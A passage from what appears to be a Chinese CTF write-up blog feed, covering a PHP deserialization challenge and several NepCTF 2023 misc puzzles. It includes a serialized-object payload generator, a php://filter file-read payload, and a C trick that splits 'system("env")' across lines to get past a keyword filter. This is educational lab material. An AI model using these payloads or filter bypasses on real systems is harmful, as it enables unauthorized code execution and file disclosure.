punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"46\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">__wakeup</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"47\"></td><td><pre>        <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">department</span><span class=\"token operator\">-></span><span class=\"token function\">hahaha</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"48\"></td><td><pre>            <span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token function\">IPO</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"49\"></td><td><pre>        <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"50\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"51\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"52\"></td><td><pre></pre></td></tr><tr><td data-num=\"53\"></td><td><pre><span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'d'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"54\"></td><td><pre>    <span class=\"token function\">unserialize</span><span class=\"token punctuation\">(</span><span class=\"token function\">base64_decode</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'d'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"55\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"56\"></td><td><pre><span class=\"token delimiter important\">?></span></span></pre></td></tr></table></figure><p>本题主要考点就在于调用 school 类中的 IPO 函数，</p>\n<p>具体可以参考这篇文章：</p>\n<p><a href=\"https://blog.csdn.net/qq_63928796/article/details/127786521?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522169545944516800197073634%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&amp;request_id=169545944516800197073634&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduend~default-1-127786521-null-null.142%5Ev94%5Einsert_down1&amp;utm_term=php%20%24a%28%24b%29&amp;spm=1018.2226.3001.4187\">php 中关于一些<span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mi>a</mi><mo stretchy=\"false\">(</mo></mrow><annotation encoding=\"application/x-tex\">a(</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:1em;vertical-align:-0.25em;\"></span><span class=\"mord mathnormal\">a</span><span class=\"mopen\">(</span></span></span></span>b)</a></p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token function\">error_reporting</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token keyword\">class</span> <span class=\"token class-name-definition class-name\">teacher</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token variable\">$name</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token variable\">$rank</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">__construct</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>        <span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">name</span> <span class=\"token operator\">=</span> <span class=\"token string single-quoted-string\">'ing'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>        <span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">rank</span> <span class=\"token operator\">=</span> <span class=\"token string single-quoted-string\">'department'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre></pre></td></tr><tr><td data-num=\"12\"></td><td><pre><span class=\"token keyword\">class</span> <span class=\"token class-name-definition class-name\">classroom</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token variable\">$name</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token variable\">$leader</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">__construct</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>        <span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">name</span> <span class=\"token operator\">=</span> <span class=\"token string single-quoted-string\">'one class'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>        <span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">leader</span> <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">teacher</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre></pre></td></tr><tr><td data-num=\"21\"></td><td><pre><span class=\"token keyword\">class</span> <span class=\"token class-name-definition class-name\">school</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token variable\">$department</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token variable\">$headmaster</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">__construct</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>        <span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">department</span> <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">classroom</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>        <span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">headmaster</span> <span class=\"token operator\">=</span> <span class=\"token string single-quoted-string\">'ong'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre><span class=\"token variable\">$a</span> <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">school</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre><span class=\"token keyword\">echo</span> <span class=\"token function\">base64_encode</span><span class=\"token punctuation\">(</span><span class=\"token function\">serialize</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$a</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></span></pre></td></tr></table></figure><p>生成 payload。<br />\n题中说了 flag 应该在 flag.php 中，因此我们直接用 php 的内置类 SplFileObject 来读取文件内容。由于没有输出，想要读取到文件里的内容要用伪协议。<br />\nPOST：<br />\na=SplFileObject&amp;b=php://filter/read=convert.base64-encode/resource=flag.php</p>\n",
            "tags": [
                "CTF",
                "无敌的Web",
                "我就是歪脖",
                "又坐牢了",
                "懂不懂python的含金量啊",
                "反序列化好难"
            ]
        },
        {
            "id": "https://p1kap1.github.io/CTF/misc/NepCTF-misc/",
            "url": "https://p1kap1.github.io/CTF/misc/NepCTF-misc/",
            "title": "NepCTF2023复现-Misc",
            "date_published": "2023-08-15T16:00:00.000Z",
            "content_html": "<h3 id=\"codes\"><a class=\"anchor\" href=\"#codes\">#</a> codes</h3>\n<blockquote>\n<p>题目：你很会写代码吗，你会写有什么用！出来混 讲的是皮 tips:flag 格式为 Nepctf {},flag 存在环境变量，无需理会 Team_Hash</p>\n</blockquote>\n<p>根据题目提示，flag 存在于环境变量中，直接用</p>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token function\">env</span></pre></td></tr></table></figure><p>命令尝试，不出意外，被过滤了。</p>\n<p><img data-src=\"../../../images/NepCTF/1.png\" alt=\"1\" height=\"200px\" width=\"400px\" /></p>\n<p>除此之外发现 system 也被过滤了。</p>\n<p>既然题目是一个 C 语言执行框，那么用 C 语言打印环境变量试试</p>\n<p>先了解下 C 程序如何打印环境变量：</p>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token comment\">// 程序启动时调用的函数名为 main。这个实现没有声明函数原型。它应该必须使用 int 的返回类型定义，并且不带参数：</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>\t\t<span class=\"token keyword\">int</span> <span class=\"token function\">main</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">void</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span> <span class=\"token comment\">/* ... */</span> <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token comment\">// 或带有两个参数（这里称为 argc 和 argv）：</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>\t\t<span class=\"token keyword\">int</span> <span class=\"token function\">main</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span> argc<span class=\"token punctuation\">,</span> <span class=\"token keyword\">char</span> <span class=\"token operator\">*</span>argv<span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span> <span class=\"token comment\">/* ... */</span> <span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><p>其中 'argc' 表示命令行参数的数量，'argv' 是一个指向指针数组的指针，每个指针指向一个表示命令行参数的字符串，紧随 'argc' 其后的是程序的环境变量，但由于这题中的 'env' 被禁了，导致 getenv 等函数都无法使用，不过一般环境变量都会在命令行里设置，所以通过打印命令行参数来间接获取到环境变量：</p>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span><span class=\"token string\">&lt;stdio.h></span></span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span> <span class=\"token string\">&lt;stdlib.h></span></span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token keyword\">int</span> <span class=\"token function\">main</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span> argc<span class=\"token punctuation\">,</span><span class=\"token keyword\">char</span> <span class=\"token operator\">*</span>argv<span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>    <span class=\"token keyword\">for</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span> i<span class=\"token operator\">=</span><span class=\"token number\">0</span><span class=\"token punctuation\">;</span> i<span class=\"token operator\">&lt;</span><span class=\"token number\">20</span><span class=\"token punctuation\">;</span> i<span class=\"token operator\">++</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>        <span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"argc[%d]:%s\\n\"</span><span class=\"token punctuation\">,</span>i<span class=\"token punctuation\">,</span>argv<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>    <span class=\"token keyword\">return</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><p>得到如下信息：</p>\n<pre><code>argc[0]:/main\nargc[1]:(null)\nargc[2]:KUBERNETES_SERVICE_PORT=443\nargc[3]:KUBERNETES_PORT=tcp://10.43.0.1:443\nargc[4]:HOSTNAME=push-c68b6eaf3e2f4f22\nargc[5]:SHLVL=0\nargc[6]:HOME=/root\nargc[7]:LC_CTYPE=C.UTF-8\nargc[8]:WERKZEUG_SERVER_FD=3\nargc[9]:_=./start.sh\nargc[10]:KUBERNETES_PORT_443_TCP_ADDR=10.43.0.1\nargc[11]:PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin\nargc[12]:KUBERNETES_PORT_443_TCP_PORT=443\nargc[13]:KUBERNETES_PORT_443_TCP_PROTO=tcp\nargc[14]:GZCTF_FLAG=Nepctf&#123;easy_codes_398561e4-197a-44a0-abc6-229ffbeae526_[TEAM_HASH]&#125; 🎈\nargc[15]:KUBERNETES_SERVICE_PORT_HTTPS=443\nargc[16]:KUBERNETES_PORT_443_TCP=tcp://10.43.0.1:443\nargc[17]:PWD=/home/ctf\nargc[18]:KUBERNETES_SERVICE_HOST=10.43.0.1\nargc[19]:(null)\n</code></pre>\n<p>flag 存在 argc [14] 中</p>\n<p>还有一种解法就是使用反斜杠绕过</p>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span> <span class=\"token string\">&lt;stdio.h></span></span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token keyword\">int</span> <span class=\"token function\">main</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>sy\\</pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token function\">stem</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"en\\</pre></td></tr><tr><td data-num=\"7\"></td><td><pre>v\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token keyword\">return</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><p>这种你的注意把主函数中的内容取消缩进，不然出不了 flag。</p>\n<h3 id=\"小叮弹钢琴\"><a class=\"anchor\" href=\"#小叮弹钢琴\">#</a> 小叮弹钢琴</h3>\n<blockquote>\n<p>小叮今天终于学会了弹钢琴，来看看他弹得怎么样吧</p>\n</blockquote>\n<p>附件名：piano.mid</p>\n<p>简单查询了 mid 文件：</p>\n<blockquote>\n<p><strong>MIDI 文件</strong>是二进制文件，其内部主要记录了乐曲播放时，音序器应发送给音源的 MIDI 指令和每条指令发送的时间点。 音序器读取这些时间信息和 MIDI 指令，通过在相应的时间发送相应的指令，以实现乐曲中音符的顺序播放和节拍信息。</p>\n</blockquote>\n<p>丢给 audacity：</p>\n<p><img data-src=\"../../../images/NepCTF/2.png\" alt=\"2\" /></p>\n<p>前半段摩斯密码：</p>\n<blockquote>\n<p>-.-- --- ..- ... .... --- ..- .-.. -.. ..- ... . - .... .. ... - --- -..- --- .-. ... --- -- . - .... .. -. --.</p>\n</blockquote>\n<p>解码：</p>\n<blockquote>\n<p>YOUSHOULDUSETHISTOXORSOMETHING</p>\n</blockquote>\n<p>后半段 16 进制：</p>\n<blockquote>\n<p>0x370a05303c290e045005031c2b1858473a5f052117032c39230f005d1e17</p>\n</blockquote>\n<p>再根据上面那句话的意思就是他两亦或运算一下</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token comment\"># 导入 binascii 模块，用于二进制和十六进制之间的转换操作</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">import</span> binascii</pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token comment\"># 将字符串 \"YOUSHOULDUSETHISTOXORSOMETHING\" 转换为小写并编码为字节序列，然后转换为十六进制表示</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>hex_string <span class=\"token operator\">=</span> binascii<span class=\"token punctuation\">.</span>b2a_hex<span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token string\">'YOUSHOULDUSETHISTOXORSOMETHING'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>lower<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>encode<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>hex_string<span class=\"token punctuation\">)</span>  <span class=\"token comment\"># 打印十六进制表示</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token comment\"># 定义两个十六进制数 a 和 b</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>a <span class=\"token operator\">=</span> <span class=\"token number\">0x796f7573686f756c6475736574686973746f786f72736f6d657468696e67</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>b <span class=\"token operator\">=</span> <span class=\"token number\">0x370a05303c290e045005031c2b1858473a5f052117032c39230f005d1e17</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre><span class=\"token comment\"># 对 a 和 b 进行异或运算，并将结果转换为十六进制表示，并去掉前缀 '0x'</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>xor_result <span class=\"token operator\">=</span> <span class=\"token builtin\">hex</span><span class=\"token punctuation\">(</span>a <span class=\"token operator\">^</span> b<span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token number\">2</span><span class=\"token punctuation\">:</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre><span class=\"token comment\"># 将异或结果的十六进制表示转换为字节序列，再转换为对应的原始二进制数据</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>original_data <span class=\"token operator\">=</span> binascii<span class=\"token punctuation\">.</span>a2b_hex<span class=\"token punctuation\">(</span>xor_result<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>original_data<span class=\"token punctuation\">)</span>  <span class=\"token comment\"># 打印还原的二进制数据</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre></pre></td></tr><tr><td data-num=\"15\"></td><td><pre></pre></td></tr><tr><td data-num=\"16\"></td><td><pre><span class=\"token comment\">#b'796f7573686f756c6475736574686973746f786f72736f6d657468696e67'</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre><span class=\"token comment\">#b'NepCTF&#123;h4ppy_p14N0&#125;NepCTF&#123;h4pp'</span></pre></td></tr></table></figure><h3 id=\"陌生的语言\"><a class=\"anchor\" href=\"#陌生的语言\">#</a> 陌生的语言</h3>\n<blockquote>\n<p>A 同学在回学校的路上捡到了一张纸条，你能帮帮她吗？</p>\n<p XX_XX=\"\">flag 格式：NepCTF</p>\n<p>hint：A 同学的英文名为 “Atsuko Kagari”</p>\n<p>hint:flag 格式请选手根据自身语感自行添加下划线</p>\n</blockquote>\n<p>附件：</p>\n<p><img data-src=\"../../../images/NepCTF/%E9%99%8C%E7%94%9F%E7%9A%84%E7%BA%B8%E6%9D%A1.jpg\" alt=\"\" height=\"400px\" width=\"400px\" /></p>\n<p>没有暗示和脑洞没法做。</p>\n<p>先搜索 “Atsuko Kagari”，发现出自日本动漫 “小魔女学园”</p>\n<p>按照下图新月文字和古龙语英文对照表即可获取 flag。</p>\n<p><img data-src=\"../../../images/NepCTF/3.jpg\" alt=\"3\" height=\"400px\" width=\"400px\" /></p>\n<p><img data-src=\"../../../images/NepCTF/4.png\" alt=\"4\" height=\"200px\" width=\"600px\" /></p>\n<p NEPNEP_A_BELIEVING_HEART_IS_YOUR_MAGIC=\"\">flag:NepCTF</p>\n<h3 id=\"你也喜欢三月七么\"><a class=\"anchor\" href=\"#你也喜欢三月七么\">#</a> 你也喜欢三月七么</h3>\n<blockquote>\n<p>Nepnep 星球如约举办 CTF 大赛，消息传播至各大星球，开拓者一行人应邀而来 ———————————————————————————————————————</p>\n<p>三月七：耶，终于来到 Nepnep 星球啦，让我看看正在火热进行的 Hacker 夺旗大赛群聊。啊！开拓者，这群名看起来怪怪的诶。 （伸出脑袋，凑近群名，轻轻的闻了一下）哇，好咸诶，开拓者你快来看看！</p>\n<p>开拓者（U_id）：(端着下巴，磨蹭了一下，眼神若有所思）这好像需要经过啥 256 处理一下才能得到我们需要的关键。</p>\n<p>三月七：那我们快想想怎么解开这个谜题！</p>\n<p +m+=\"\">flag 格式：NepCTF</p>\n<p>hint:URL 为压缩包密码</p>\n</blockquote>\n<p>附件中是个 txt 文件和需要密码的压缩包：</p>\n<blockquote>\n<p>salt_lenth= 10<br />\nkey_lenth= 16<br />\niv= 88219bdee9c396eca3c637c0ea436058 #原始 iv 转 hex 的值<br />\n ciphertext= b700ae6d0cc979a4401f3dd440bf9703b292b57b6a16b79ade01af58025707fbc29941105d7f50f2657cf7eac735a800ecccdfd42bf6c6ce3b00c8734bf500c819e99e074f481dbece626ccc2f6e0562a81fe84e5dd9750f5a0bb7c20460577547d3255ba636402d6db8777e0c5a429d07a821bf7f9e0186e591dfcfb3bfedfc</p>\n</blockquote>\n<p>先看题目描述，得到两个消息，一是群名是 salt，二是群名 sha256 之后就是 key，这就纯脑洞了，群名让我想起了 qq 群名 NepCTF2023，对应的长度也为 10，key 取 sha256 之后前 16 位</p>\n<blockquote>\n<p>dd8e671df3882c5be6423cd030bd7cb6</p>\n</blockquote>\n<p>再用 AES 解密：</p>\n<blockquote>\n<p>6148523063484d364c793970625763784c6d6c745a3352774c6d4e76625338794d44497a4c7a41334c7a49304c336c5061316858553070554c6e42755a773d3d</p>\n</blockquote>\n<p>最后先把 16 进制转换为字符串，得到一串 base64 编码，再对其解码得到图片链接：</p>\n<p><img data-src=\"../../../images/NepCTF/5.png\" alt=\"5\" height=\"200px\" width=\"500px\" /></p>\n<p><img data-src=\"../../../images/NepCTF/6.png\" alt=\"6\" /></p>\n<p>这串只要玩过星穹铁道都能一眼就能看出是<span class=\"exturl\" data-url=\"aHR0cHM6Ly9zdGFycmFpbC5odWlqaXdpa2kuY29tL3dpa2kvJUU3JUE5JUJBJUU5JTk3JUI0JUU3JUFCJTk5JUUzJTgwJThDJUU5JUJCJTkxJUU1JUExJTk0JUUzJTgwJThE\">空间站「黑塔」</span>和<span class=\"exturl\" data-url=\"aHR0cHM6Ly9zdGFycmFpbC5odWlqaXdpa2kuY29tL3dpa2kvJUU5JTlCJTg1JUU1JTg4JUE5JUU2JUI0JTlCLVZJ\">雅利洛 - VI</span> 使用该文字 (●'◡'●)</p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9zdGFycmFpbC5odWlqaXdpa2kuY29tL3dpa2kvJUU2JTk2JTg3JUU1JUFEJTk3JUU1JUFGJUI5JUU3JTg1JUE3JUU4JUExJUE4\">星穹铁道智库</span></p>\n<p><img data-src=\"../../../images/NepCTF/7.png\" alt=\"7\" height=\"320px\" width=\"800px\" /></p>\n<p HRP_always_likes_March_7th=\"\">对照一下即可得到 flag:NepCTF</p>\n<h3 id=\"ez_basic_ii\"><a class=\"anchor\" href=\"#ez_basic_ii\">#</a> Ez_BASIC_II</h3>\n<blockquote>\n<p>穿越回 1977 年的 Lemon 赶上了世界上第一批大规模生产的个人电脑发售。经过数月努力他终于拥有了一台计算机。他迫不及待地将自己编写的 BASIC 程序分享给了 H3，但由于 Lemon 对 BASIC 语言不熟悉导致他写错了代码段。数月后他带着装有程序的磁带回到了 21 世纪，但你能帮他还原磁带中的程序吗？</p>\n</blockquote>\n<p>在线工具直接转换</p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cubXktdHJzLTgwLmNvbS9jYXNzZXR0ZS8=\">https://www.my-trs-80.com/cassette/</span></p>\n<p>拿到 BASIC 程序</p>\n<figure class=\"highlight basic\"><figcaption data-lang=\"BASIC\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">13</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">160</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">176</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">176</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">13</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">186</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">135</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">131</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">139</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">189</span><span class=\"token punctuation\">)</span><span class=\"token 